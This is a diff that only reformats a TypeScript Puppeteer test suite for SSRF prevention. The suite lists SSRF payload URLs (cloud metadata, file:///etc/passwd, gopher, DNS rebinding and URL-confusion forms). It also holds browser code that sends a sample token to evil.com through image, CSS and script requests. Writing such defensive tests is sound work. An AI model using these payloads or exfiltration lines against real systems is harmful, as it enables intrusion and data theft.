@@ -70,14 +70,14 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'sftp://127.0.0.1/',
         'tftp://127.0.0.1/',
         'ldap://127.0.0.1/',
-        'ssh://127.0.0.1/'
+        'ssh://127.0.0.1/',
       ];
 
       for (const url of internalAddresses) {
         try {
           const response = await page.goto(url, {
             waitUntil: 'networkidle0',
-            timeout: 5000
+            timeout: 5000,
           });
 
           // Should not access internal resources
@@ -90,7 +90,9 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
           }
         } catch (error: any) {
           // Should fail or be blocked
-          expect(error.message).toMatch(/Navigation|ERR_FAILED|ERR_ABORTED|ERR_CONNECTION_REFUSED|ERR_INVALID_URL/);
+          expect(error.message).toMatch(
+            /Navigation|ERR_FAILED|ERR_ABORTED|ERR_CONNECTION_REFUSED|ERR_INVALID_URL/,
+          );
         }
       }
     });
@@ -112,14 +114,14 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'http://169.254.169.254.evil.com',
         'http://metadata.evil.com',
         'http://localhost.localtest.me',
-        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io'
+        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
       ];
 
       for (const url of dnsRebindingUrls) {
         try {
           await page.goto(url, {
             waitUntil: 'domcontentloaded',
-            timeout: 3000
+            timeout: 3000,
           });
 
           // Check that we didn't access internal resources
@@ -174,14 +176,14 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'https://@127.0.0.1/',
         '//127.0.0.1/',
         '///127.0.0.1/',
-        '\\\\127.0.0.1\\'
+        '\\\\127.0.0.1\\',
       ];
 
       for (const url of confusionUrls) {
         try {
           await page.goto(url, {
             waitUntil: 'domcontentloaded',
-            timeout: 3000
+            timeout: 3000,
           });
 
           // Should not bypass to internal addresses
@@ -204,14 +206,14 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'http://httpbin.org/redirect-to?url=file:///etc/passwd',
         'http://httpbin.org/redirect/3', // Multiple redirects
         'http://bit.ly/ssrf-test', // URL shortener (hypothetical)
-        'http://tinyurl.com/ssrf-test' // URL shortener (hypothetical)
+        'http://tinyurl.com/ssrf-test', // URL shortener (hypothetical)
       ];
 
       for (const url of redirectUrls) {
         try {
           // Set up request interception to check redirects
           await page.setRequestInterception(true);
-          
+
           const requests: string[] = [];
           page.on('request', (request) => {
             requests.push(request.url());
@@ -220,7 +222,7 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
 
           await page.goto(url, {
             waitUntil: 'networkidle0',
-            timeout: 5000
+            timeout: 5000,
           });
 
           // Check that no internal URLs were accessed
@@ -251,7 +253,7 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'http://10.0.0.1',
         'file:///etc/passwd',
         'gopher://127.0.0.1:70/',
-        'dict://127.0.0.1:11211/'
+        'dict://127.0.0.1:11211/',
       ];
 
       for (const target of ssrfTargets) {
@@ -299,7 +301,7 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'ws://192.168.1.1/',
         'wss://127.0.0.1:443',
         'ws://[::1]:8080',
-        'ws://metadata.google.internal/'
+        'ws://metadata.google.internal/',
       ];
 
       for (const target of wsTargets) {
@@ -331,7 +333,7 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
         'http://localhost:8080',
         'http://169.254.169.254/',
         'file:///etc/passwd',
-        'http://192.168.1.1'
+        'http://192.168.1.1',
       ];
 
       for (const target of iframeTargets) {
@@ -342,7 +344,7 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
             iframe.onload = () => resolve({ loaded: true });
             iframe.onerror = () => resolve({ loaded: false });
             document.body.appendChild(iframe);
-            
+
             setTimeout(() => {
               document.body.removeChild(iframe);
               resolve({ loaded: false, timeout: true });
@@ -372,17 +374,17 @@ describe('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
       // Attempt various data exfiltration techniques
       await page.evaluate(() => {
         const sensitiveData = 'secret-token-12345';
-        
+
         // Try to exfiltrate via image
         const img = new Image();
         img.src = `http://evil.com/steal?data=${sensitiveData}`;
-        
+
         // Try to exfiltrate via CSS
         const link = document.createElement('link');
         link.rel = 'stylesheet';
         link.href = `http://evil.com/css?data=${sensitiveData}`;
         document.head.appendChild(link);
-        
+
         // Try to exfiltrate via script
         const script = document.createElement('script');
         script.src = `http://evil.com/js?data=${sensitiveData}`;
